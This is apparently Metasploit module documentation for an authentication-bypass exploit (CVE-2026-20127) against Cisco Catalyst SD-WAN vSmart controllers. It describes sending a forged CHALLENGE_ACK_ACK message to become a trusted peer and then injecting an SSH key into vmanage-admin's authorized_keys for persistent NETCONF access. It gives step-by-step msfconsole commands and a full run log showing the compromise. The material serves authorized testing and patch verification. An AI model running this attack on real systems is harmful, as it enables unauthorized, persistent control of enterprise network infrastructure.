## Vulnerable Application

This module exploits CVE-2026-20127, an authentication bypass vulnerability in the Cisco Catalyst SD-WAN Controller
(vSmart). The vulnerability exists in the vdaemon DTLS control-plane service running on UDP port 12346.

The vdaemon service fails to properly validate the `verify_status` byte in `CHALLENGE_ACK_ACK` (msg_type=10) messages.
The `vbond_proc_challenge_ack_ack()` handler reads an attacker-controlled `verify_status` byte from the message body and,
if non-zero, sets the peer's authenticated flag to 1. Furthermore, the authentication gate in `vbond_proc_msg()` exempts
msg_type=10 from authentication checks, allowing an unauthenticated peer to send this message.

An attacker can:
1. Connect via DTLS 1.2 using a self-signed certificate (the server performs no certificate validation at the handshake stage)
2. Skip the `CHALLENGE_ACK` step entirely
3. Send a forged `CHALLENGE_ACK_ACK` message with `verify_status=1` to become a trusted peer without any legitimate credentials

Once authenticated, the module leverages a `VMANAGE_TO_PEER` message to inject an SSH public key into the
`/home/vmanage-admin/.ssh/authorized_keys` file, providing persistent SSH access to the controller's NETCONF service
on port 830.

### Affected Versions

The vulnerability affects Cisco Catalyst SD-WAN Controller (vSmart) versions prior to the patches released in February 2026.
Consult [Cisco's security advisory](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-rpa-EHchtZk)
for a complete list of affected versions and patches.

## Verification Steps

1. Start `msfconsole`
2. `use auxiliary/admin/networking/cisco_sdwan_auth_bypass`
3. `set RHOST <target_ip>`
4. Optionally, `set DOMAIN_ID <domain_id>` and `set SITE_ID <site_id>` if you know the target's SD-WAN topology
5. `check` to verify the target is vulnerable
6. `run` to exploit the vulnerability and inject an SSH public key
7. Use the generated SSH private key to connect to the NETCONF service: `ssh -i <key_path> vmanage-admin@<target_ip> -p 830`

## Options

### DOMAIN_ID

The SD-WAN domain ID to use in protocol messages. Default: `1`.

This value must match the domain ID configured on the target controller. In most deployments, the default value of 1
is used. If you receive a `TEAR_DOWN` message after sending `Hello`, try adjusting this value.

### SITE_ID

The SD-WAN site ID to use in protocol messages. Default: `100`.

This value identifies the site in the SD-WAN topology. The default value should work in most cases, but if the exploit
fails, you may need to adjust this based on knowledge of the target's SD-WAN configuration.

### SSH_PUBLIC_KEY_FILE

Path to an existing SSH public key file (in OpenSSH format) to inject into the controller.

If not set, the module will automatically generate a new RSA 2048-bit SSH keypair. Using an existing key can be useful
if you want to maintain access using a key you already control.

## Scenarios

### Cisco Catalyst SD-WAN Controller 20.15.3 (Default Configuration)

In this scenario, we target a vSmart controller with default settings. The module automatically generates an SSH keypair
and injects the public key.

```
msf auxiliary(admin/networking/cisco_sdwan_auth_bypass) > show options 

Module options (auxiliary/admin/networking/cisco_sdwan_auth_bypass):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   DOMAIN_ID            1                yes       SD-WAN domain ID
   RHOSTS               192.168.86.166   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-
                                                   metasploit.html
   RPORT                12346            yes       The target port (UDP)
   SITE_ID              100              yes       SD-WAN site ID
   SSH_PUBLIC_KEY_FILE                   no        Path to an existing SSH public key file to inject


View the full module info with the info, or info -d command.

msf auxiliary(admin/networking/cisco_sdwan_auth_bypass) > check
[+] 192.168.86.166:12346 - The target is vulnerable. Authentication bypass succeeded - server accepted forged CHALLENGE_ACK_ACK
msf auxiliary(admin/networking/cisco_sdwan_auth_bypass) > run
[*] Running module against 192.168.86.166
[*] Phase 1: DTLS handshake with self-signed certificate
[*] DTLS handshake succeeded (self-signed cert accepted)
[*] Phase 2: Waiting for CHALLENGE from server
[*] CHALLENGE received (580 bytes of challenge data)
[*] Phase 3: Sending CHALLENGE_ACK_ACK with verify_status=1
[*] Server Hello received
[*] Phase 4: Sending Hello as authenticated peer
[*] Hello response received - we are now a trusted peer
[*] Phase 5: SSH key injection into vmanage-admin authorized_keys
[*] Generating RSA 2048-bit SSH keypair
[*] SSH private key saved to loot: /home/sfewer/.msf4/loot/20260326150429_default_192.168.86.166_cisco.sdwan.sshk_366073.pem
[+] Connect to NETCONF via:
chmod 600 /home/sfewer/.msf4/loot/20260326150429_default_192.168.86.166_cisco.sdwan.sshk_366073.pem
ssh -i /home/sfewer/.msf4/loot/20260326150429_default_192.168.86.166_cisco.sdwan.sshk_366073.pem vmanage-admin@192.168.86.166 -p 830
[*] Server responded with: REGISTER_TO_VMANAGE (key has been injected)
[+] Authentication bypass and SSH key injection completed!
[*] Auxiliary module execution completed
msf auxiliary(admin/networking/cisco_sdwan_auth_bypass) >

```

Now we can use the generated SSH key to access the NETCONF service:

```console
sfewer@sfewer-ubuntu-vm:~$ chmod 600 /home/sfewer/.msf4/loot/20260326150429_default_192.168.86.166_cisco.sdwan.sshk_366073.pem
sfewer@sfewer-ubuntu-vm:~$ ssh -i /home/sfewer/.msf4/loot/20260326150429_default_192.168.86.166_cisco.sdwan.sshk_366073.pem vmanage-admin@192.168.86.166 -p 830
viptela 20.15.3 

<?xml version="1.0" encoding="UTF-8"?>
<hello xmlns="urn:ietf:params:xml:ns:netconf:base:1.0">
<capabilities>
<capability>urn:ietf:params:netconf:base:1.0</capability>
<capability>urn:ietf:params:netconf:base:1.1</capability>
<capability>urn:ietf:params:netconf:capability:confirmed-commit:1.1</capability>
<capability>urn:ietf:params:netconf:capability:confirmed-commit:1.0</capability>
<capability>urn:ietf:params:netconf:capability:candidate:1.0</capability>
<capability>urn:ietf:params:netconf:capability:rollback-on-error:1.0</capability>
<capability>urn:ietf:params:netconf:capability:url:1.0?scheme=ftp,sftp,file</capability>
<capability>urn:ietf:params:netconf:capability:validate:1.0</capability>
<capability>urn:ietf:params:netconf:capability:validate:1.1</capability>
<capability>urn:ietf:params:netconf:capability:xpath:1.0</capability>
<capability>urn:ietf:params:netconf:capability:notification:1.0</capability>
<capability>urn:ietf:params:netconf:capability:interleave:1.0</capability>
<capability>urn:ietf:params:netconf:capability:partial-lock:1.0</capability>
<capability>urn:ietf:params:netconf:capability:with-defaults:1.0?basic-mode=trim&amp;also-supported=report-all-tagged,report-all</capability>
<capability>urn:ietf:params:netconf:capability:with-operational-defaults:1.0?basic-mode=trim&amp;also-supported=report-all-tagged,report-all</capability>
<capability>urn:ietf:params:netconf:capability:yang-library:1.0?revision=2019-01-04&amp;module-set-id=f1952c280658dd3701add48f1c71cbca</capability>
<capability>urn:ietf:params:netconf:capability:yang-library:1.1?revision=2019-01-04&amp;content-id=f1952c280658dd3701add48f1c71cbca</capability>
<capability>http://tail-f.com/ns/netconf/actions/1.0</capability>
<capability>http://tail-f.com/ns/aaa/1.1?module=tailf-aaa&amp;revision=2023-04-13</capability>
<capability>http://tail-f.com/ns/common/query?module=tailf-common-query&amp;revision=2017-12-15</capability>
<capability>http://tail-f.com/ns/confd-progress?module=tailf-confd-progress&amp;revision=2020-06-29</capability>
<capability>http://tail-f.com/ns/confd_dyncfg/1.0?module=confd_dyncfg&amp;revision=2023-09-29</capability>
<capability>http://tail-f.com/ns/ietf-subscribed-notifications-deviation?module=ietf-subscribed-notifications-deviation&amp;revision=2020-06-25</capability>
<capability>http://tail-f.com/ns/ietf-yang-push-deviation?module=ietf-yang-push-deviation</capability>
<capability>http://tail-f.com/ns/kicker?module=tailf-kicker&amp;revision=2020-11-26</capability>
<capability>http://tail-f.com/ns/mibs/IPV6-TC/199812010000Z?module=IPV6-TC&amp;revision=1998-12-01</capability>
<capability>http://tail-f.com/ns/mibs/SNMP-COMMUNITY-MIB/200308060000Z?module=SNMP-COMMUNITY-MIB&amp;revision=2003-08-06</capability>
<capability>http://tail-f.com/ns/mibs/SNMP-FRAMEWORK-MIB/200210140000Z?module=SNMP-FRAMEWORK-MIB&amp;revision=2002-10-14</capability>
<capability>http://tail-f.com/ns/mibs/SNMP-MPD-MIB/200210140000Z?module=SNMP-MPD-MIB&amp;revision=2002-10-14</capability>
<capability>http://tail-f.com/ns/mibs/SNMP-NOTIFICATION-MIB/200210140000Z?module=SNMP-NOTIFICATION-MIB&amp;revision=2002-10-14</capability>
<capability>http://tail-f.com/ns/mibs/SNMP-TARGET-MIB/200210140000Z?module=SNMP-TARGET-MIB&amp;revision=2002-10-14</capability>
<capability>http://tail-f.com/ns/mibs/SNMP-USER-BASED-SM-MIB/200210160000Z?module=SNMP-USER-BASED-SM-MIB&amp;revision=2002-10-16</capability>
<capability>http://tail-f.com/ns/mibs/SNMP-VIEW-BASED-ACM-MIB/200210160000Z?module=SNMP-VIEW-BASED-ACM-MIB&amp;revision=2002-10-16</capability>
<capability>http://tail-f.com/ns/mibs/SNMPv2-MIB/200210160000Z?module=SNMPv2-MIB&amp;revision=2002-10-16</capability>
<capability>http://tail-f.com/ns/mibs/SNMPv2-SMI/1.0?module=SNMPv2-SMI</capability>
<capability>http://tail-f.com/ns/mibs/SNMPv2-TC/1.0?module=SNMPv2-TC</capability>
<capability>http://tail-f.com/ns/mibs/TRANSPORT-ADDRESS-MIB/200211010000Z?module=TRANSPORT-ADDRESS-MIB&amp;revision=2002-11-01</capability>
<capability>http://tail-f.com/ns/netconf/query?module=tailf-netconf-query&amp;revision=2017-01-06</capability>
<capability>http://tail-f.com/yang/acm?module=tailf-acm&amp;revision=2013-03-07</capability>
<capability>http://tail-f.com/yang/common?module=tailf-common&amp;revision=2023-12-07</capability>
<capability>http://tail-f.com/yang/common-monitoring?module=tailf-common-monitoring&amp;revision=2022-09-29</capability>
<capability>http://tail-f.com/yang/common-monitoring2?module=tailf-common-monitoring2&amp;revision=2022-09-29</capability>
<capability>http://tail-f.com/yang/confd-monitoring?module=tailf-confd-monitoring&amp;revision=2022-09-29</capability>
<capability>http://tail-f.com/yang/confd-monitoring2?module=tailf-confd-monitoring2&amp;revision=2022-10-03</capability>
<capability>http://tail-f.com/yang/last-login?module=tailf-last-login&amp;revision=2019-11-21</capability>
<capability>http://tail-f.com/yang/netconf-monitoring?module=tailf-netconf-monitoring&amp;revision=2022-04-12</capability>
<capability>http://tail-f.com/yang/xsd-types?module=tailf-xsd-types&amp;revision=2017-11-20</capability>
<capability>http://viptela.com/aaa-ext?module=viptela-aaa-ext&amp;revision=2024-07-01</capability>
<capability>http://viptela.com/actions?module=viptela-actions&amp;revision=2024-07-01</capability>
<capability>http://viptela.com/clear?module=viptela-clear&amp;revision=2024-07-01</capability>
<capability>http://viptela.com/common?module=viptela-common&amp;revision=2024-07-01</capability>
<capability>http://viptela.com/debug?module=viptela-debug&amp;revision=2024-07-01</capability>
<capability>http://viptela.com/devices?module=viptela-devices</capability>
<capability>http://viptela.com/hardware?module=viptela-hardware&amp;revision=2024-07-01</capability>
<capability>http://viptela.com/idmgr?module=viptela-idmgr&amp;revision=2024-07-01</capability>
<capability>http://viptela.com/models?module=viptela-models</capability>
<capability>http://viptela.com/omp?module=viptela-omp&amp;revision=2024-07-01</capability>
<capability>http://viptela.com/oper-idmgr?module=viptela-oper-idmgr&amp;revision=2024-07-01</capability>
<capability>http://viptela.com/oper-system?module=viptela-oper-system&amp;revision=2024-07-01</capability>
<capability>http://viptela.com/oper-tenant?module=viptela-oper-tenant</capability>
<capability>http://viptela.com/oper-vpn?module=viptela-oper-vpn&amp;revision=2024-07-01</capability>
<capability>http://viptela.com/policy?module=viptela-policy&amp;revision=2024-07-01&amp;deviations=viptela-policy-deviation</capability>
<capability>http://viptela.com/security?module=viptela-security&amp;revision=2024-07-01</capability>
<capability>http://viptela.com/snmp?module=viptela-snmp&amp;revision=2024-07-01</capability>
<capability>http://viptela.com/snmp-usm?module=viptela-snmp-usm&amp;revision=2024-07-01</capability>
<capability>http://viptela.com/support?module=viptela-support&amp;revision=2024-07-01</capability>
<capability>http://viptela.com/system?module=viptela-system&amp;revision=2024-07-01&amp;deviations=viptela-system-deviation</capability>
<capability>http://viptela.com/tag-instance?module=viptela-tag-instance&amp;revision=2024-07-01</capability>
<capability>http://viptela.com/tenant?module=viptela-tenant&amp;revision=2024-07-01</capability>
<capability>http://viptela.com/timezones?module=viptela-timezones&amp;revision=2024-07-01</capability>
<capability>http://viptela.com/viptela-clear-tenant?module=viptela-clear-tenant</capability>
<capability>http://viptela.com/viptela-debug-tenant?module=viptela-debug-tenant</capability>
<capability>http://viptela.com/viptela-global?module=viptela-global&amp;revision=2024-07-01</capability>
<capability>http://viptela.com/vpn?module=viptela-vpn&amp;revision=2024-07-01</capability>
<capability>urn:ietf:params:xml:ns:netconf:base:1.0?module=ietf-netconf&amp;revision=2011-06-01&amp;features=confirmed-commit,candidate,rollback-on-error,validate,xpath,url</capability>
<capability>urn:ietf:params:xml:ns:netconf:partial-lock:1.0?module=ietf-netconf-partial-lock&amp;revision=2009-10-19</capability>
<capability>urn:ietf:params:xml:ns:yang:iana-crypt-hash?module=iana-crypt-hash&amp;revision=2014-08-06&amp;features=crypt-hash-sha-512,crypt-hash-sha-256,crypt-hash-md5</capability>
<capability>urn:ietf:params:xml:ns:yang:ietf-inet-types?module=ietf-inet-types&amp;revision=2013-07-15</capability>
<capability>urn:ietf:params:xml:ns:yang:ietf-netconf-acm?module=ietf-netconf-acm&amp;revision=2018-02-14</capability>
<capability>urn:ietf:params:xml:ns:yang:ietf-netconf-monitoring?module=ietf-netconf-monitoring&amp;revision=2010-10-04</capability>
<capability>urn:ietf:params:xml:ns:yang:ietf-netconf-notifications?module=ietf-netconf-notifications&amp;revision=2012-02-06</capability>
<capability>urn:ietf:params:xml:ns:yang:ietf-netconf-with-defaults?module=ietf-netconf-with-defaults&amp;revision=2011-06-01</capability>
<capability>urn:ietf:params:xml:ns:yang:ietf-restconf-monitoring?module=ietf-restconf-monitoring&amp;revision=2017-01-26</capability>
<capability>urn:ietf:params:xml:ns:yang:ietf-x509-cert-to-name?module=ietf-x509-cert-to-name&amp;revision=2014-12-10</capability>
<capability>urn:ietf:params:xml:ns:yang:ietf-yang-metadata?module=ietf-yang-metadata&amp;revision=2016-08-05</capability>
<capability>urn:ietf:params:xml:ns:yang:ietf-yang-smiv2?module=ietf-yang-smiv2&amp;revision=2012-06-22</capability>
<capability>urn:ietf:params:xml:ns:yang:ietf-yang-types?module=ietf-yang-types&amp;revision=2013-07-15</capability>
</capabilities>
<session-id>25</session-id></hello>]]>]]>
```
